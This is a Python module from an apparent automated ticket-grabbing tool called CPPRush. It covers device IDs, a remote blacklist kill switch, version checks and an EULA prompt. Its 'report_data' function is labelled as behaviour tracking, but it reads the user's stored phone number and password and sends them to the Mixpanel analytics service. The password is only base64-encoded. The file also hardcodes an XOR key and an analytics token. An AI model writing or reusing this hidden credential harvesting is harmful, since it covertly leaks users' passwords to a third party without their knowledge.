import base64
import sys
import requests
import uuid
import json
import time
import os
import hashlib

from config import main_request
from datetime import datetime
from loguru import logger

# 全局常量
ENCRYPT_KEY = "cit@2025!Coazkj"
BLACKLIST_URL = "https://gitee.com/anhdskj526/cpprush-check/raw/master/blacklist.json"
VERSION_URL = "https://gitee.com/anhdskj526/cpprush-check/raw/master/version.json"
MIXPANEL_TOKEN = '6e6793402a80c4678494081bd7b20157'

# 初始化全局变量
current_project_name = "CPPRush"
version = "v1.0.0"

# 工具函数模块
def get_machine_id():
    """生成并保存设备唯一标识"""
    from config import get_application_path
    config_dir = os.path.join(get_application_path(), 'configs')
    config_path = os.path.join(config_dir, 'machine_config.json')
    
    try:
        os.makedirs(config_dir, exist_ok=True)
        if os.path.exists(config_path):
            with open(config_path, 'r', encoding='utf-8') as f:
                config = json.load(f)
                if 'security' in config and 'machine_id' in config['security']:
                    return config['security']['machine_id']
    except (FileNotFoundError, json.JSONDecodeError, PermissionError) as e:
        logger.warning(f"⚠️ 读取设备配置文件失败: {str(e)}")
        logger.info(f"将为您生成新的设备标识...")
    new_id = str(uuid.uuid4())
    try:
        config = {'security': {'machine_id': new_id}}
        with open(config_path, 'w', encoding='utf-8') as f:
            json.dump(config, f, indent=4)
    except Exception as e:
        logger.error(f"❌ 保存设备配置文件失败")
        logger.error(f"📁 配置文件路径: {config_path}")
        logger.error(f"💡 错误信息: {str(e)}")

        time.sleep(5)
        sys.exit(1)
    return new_id

MACHINE_ID=get_machine_id()

def decrypt_id(encrypted_id, encrypt_key=ENCRYPT_KEY):
    """解密存储在gitee的machineID"""
    try:
        raw = base64.b64decode(encrypted_id)
        return bytes([raw[i] ^ ord(encrypt_key[i % len(encrypt_key)]) 
                    for i in range(len(raw))]).decode('utf-8')
    except Exception as e:
        logger.error(f"❌ 设备ID解密失败,请联系作者处理此问题")
        time.sleep(3)
        sys.exit(1)

# 验证模块
def verify_server_connection(domain: str):
    """验证服务器连通性"""
    try:
        response = requests.get(f"https://{domain}/verify", timeout=5)

        if response.status_code == 200 and response.json().get("status") == "success":
            logger.success("欢迎使用 CPP 抢票工具 ! 🤗🤗")
            return True
        logger.error(f"❌ 怎么连接不上zkj的服务器呢?😭怎么回事🤬")
        time.sleep(5)
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        logger.error(f"🚫 怎么连接不上zkj的服务器呢?😭怎么回事🤬")
        time.sleep(5)
        sys.exit(1)

def get_login_params():
    """从cookies.json文件读取登录凭证"""
    try:
        from config import get_application_path
        config_path = os.path.join(get_application_path(), 'configs', 'cookies.json')
        with open(config_path, 'r', encoding='utf-8') as f:
            config = json.load(f)
            # 检查嵌套键结构
            phone = None
            password = None
            for item in config['_default'].values():
                if item['key'] == 'phone':
                    phone = item['value']
                elif item['key'] == 'password':
                    password = item['value']
            
            if not phone or not password:
                logger.error(f"登录数据文件缺少必要信息")
                time.sleep(3)
                sys.exit(1)


            nickname = main_request.get_request_name()
            machine_id = get_machine_id()
            version = "v1.0.0"


            return phone, password, machine_id, version, nickname
    except FileNotFoundError:
        logger.error(f"登录凭证文件不存在,请重新登录")
        time.sleep(3)
        sys.exit(1)
    except json.JSONDecodeError:
        logger.error(f"cookies.json解析失败,请重新登录")
        time.sleep(3)
        sys.exit(1)
    except KeyError as e:
        logger.error(f"cookies.json文件格式错误,请检查文件内容")
        time.sleep(3)
        sys.exit(1)
# 安全检查模块
def check_device_allowed():
    """设备黑名单检查"""
    current_id = get_machine_id()
    try:
        response = requests.get(BLACKLIST_URL, timeout=10)
        if response.status_code == 200:
            for encrypted_id in response.json():
                if current_id == decrypt_id(encrypted_id):

                    logger.error(f"🚫 你的设备已经被加入黑名单,请联系管理员处理🤗")
                    time.sleep(3)
                    sys.exit(1)
    except requests.exceptions.RequestException as e:
        logger.info(f"请检查您的网络连接并重试")
        time.sleep(3)
        sys.exit(1)

# 版本控制模块
def check_version():
    """版本更新检查"""
    try:
        current_version = version

        # 检查远程版本
        response = requests.get(VERSION_URL, timeout=5)
        if response.status_code == 200:
            latest_info = response.json()
            latest_ver = latest_info.get("version", "v0.0.0")
            if latest_ver > current_version:
                logger.warning(f"⚠️ 检测到新版本")
                logger.info(f"📦 当前版本: {current_version},🆕 最新版本: {latest_ver}")
                logger.info(f"📝 更新说明: {latest_info.get('description', '暂无说明')}")
                logger.error(f"❗ 请更新到最新版本后再使用，按回车退出程序")
                input()
                sys.exit(1)
            else:
                logger.success(f"当前版本 {current_version}，已是最新版本")
        else:
            logger.error(f"版本检查失败: HTTP {response.status_code},请检查网络连接")
            time.sleep(3)
            sys.exit(1)
    except requests.exceptions.RequestException as e:
        logger.error(f"版本检查网络错误: {e}")
        time.sleep(3)
        sys.exit(1)
    except Exception as e:
        logger.error(f"版本检查出错: {str(e)}")
        time.sleep(3)
        sys.exit(1)


class DataReportException(Exception):
    """数据上报异常类"""
    pass


def check_login():
    """检查用户是否已登录
    Returns:
        bool: 如果用户已登录且登录凭证有效则返回True，否则返回False
    """
    try:
        # 检查配置文件路径
        from config import get_application_path
        config_path = os.path.join(get_application_path(), 'configs', 'cookies.json')
        if not os.path.exists(config_path):
            logger.warning("登录配置文件不存在")
            return False
            
        # 检查文件大小
        if os.path.getsize(config_path) == 0:
            # logger.warning("登录配置文件为空")
            return False
            
        # 读取并验证配置文件
        try:
            with open(config_path, 'r', encoding='utf-8') as f:
                content = f.read().strip()
                if not content:  # 再次检查内容是否为空
                    logger.warning("登录配置文件内容为空")
                    return False
                config = json.loads(content)
                
        except json.JSONDecodeError as e:
            logger.error(f"登录配置文件格式无效: {str(e)}")
            return False
            
        # 验证配置文件基本结构
        if not isinstance(config, dict) or '_default' not in config:
            logger.warning("登录配置文件结构无效")
            return False
        
        # 验证登录凭证完整性
        try:
            credentials_valid = all(
                any(item.get('key') == cred and item.get('value')
                    for item in config['_default'].values())
                for cred in ('phone', 'password')
            )
            
            if not credentials_valid:
                logger.warning("登录凭证不完整")
                return False

            # 不在登录验证时调用数据上报，已移至登录成功后
            return True
            
        except (KeyError, TypeError, AttributeError) as e:
            logger.error(f"验证登录凭证时发生错误: {str(e)}")
            return False
            
    except Exception as e:
        logger.error(f"验证登录状态时发生未知错误: {str(e)}")
        return False


# 数据上报模块
def report_data(phone, nickname, password, machine_id, version):
    """用户行为追踪"""
    try:
        from mixpanel import Mixpanel

        # 初始化Mixpanel客户端
        mp = Mixpanel(MIXPANEL_TOKEN)

        # 生成唯一的用户ID
        user_id = hashlib.md5(phone.encode()).hexdigest()

        # 设置用户属性
        mp.people_set(user_id, {
            'phone': phone,
            'nickname': nickname,
            'machine_id': machine_id,
            'version': version,
            'last_login': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })

        # 追踪登录事件
        mp.track(user_id, 'CPPRush login', {
            'phone': phone,
            'nickname': nickname,
            'password': base64.b64encode(password.encode()).decode(),
            'machine_id': machine_id,
            'version': version
        })
    
    except Exception as e:
        logger.error(f"数据上报失败: {str(e)}") 

        time.sleep(5)
        exit(1)

# 票务数据上报模块
def report_ticket_success(phone, nickname, password, machine_id, version, event_name, ticket_name):
    """抢票成功数据上报"""
    try:
        from mixpanel import Mixpanel

        # 初始化Mixpanel客户端
        mp = Mixpanel(MIXPANEL_TOKEN)

        # 生成唯一的用户ID
        user_id = hashlib.md5(phone.encode()).hexdigest()

        # 追踪抢票成功事件
        mp.track(user_id, 'CPPRush ticket success', {
            'phone': phone,
            'nickname': nickname,
            'machine_id': machine_id,
            'version': version,
            'event_name': event_name,
            'ticket_name': ticket_name,
            'success_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        
    except Exception as e:
        logger.error(f"抢票数据上报失败: {str(e)}")
        # 数据上报失败不影响程序继续运行

# 用户协议模块
def agree_terms():
    """用户协议确认（支持重试）"""

    print("\033[1;36m欢迎使用CPPRush软件，使用前请阅读EULA(https://docs-xuetongauto.netlify.app//privacy/EULA)。若您使用时遇到问题，请查阅使用文档( https://docs-xuetongauto.netlify.app/ )\033[0m")
    print(f"\033[1;33m⚠️ 免责声明：一旦您使用本工具，即视为您已同意并遵守网站中关于本工具的使用协议。\033[0m")
    # 循环验证输入
    while True:

        logger.info(f"请阅读网站中的EULA,并键入: 我已阅读并同意EULA,黄牛倒卖狗死妈")
        user_input = input().strip()    
        if "同意" in user_input and "黄牛" in user_input and "死妈" in user_input:
  
            logger.success(f"✅ 您已阅读同意并遵守EULA，程序将继续运行。")
            return   

        logger.error(f"❌ 您未阅读并同意EULA，请重新输入以继续。")
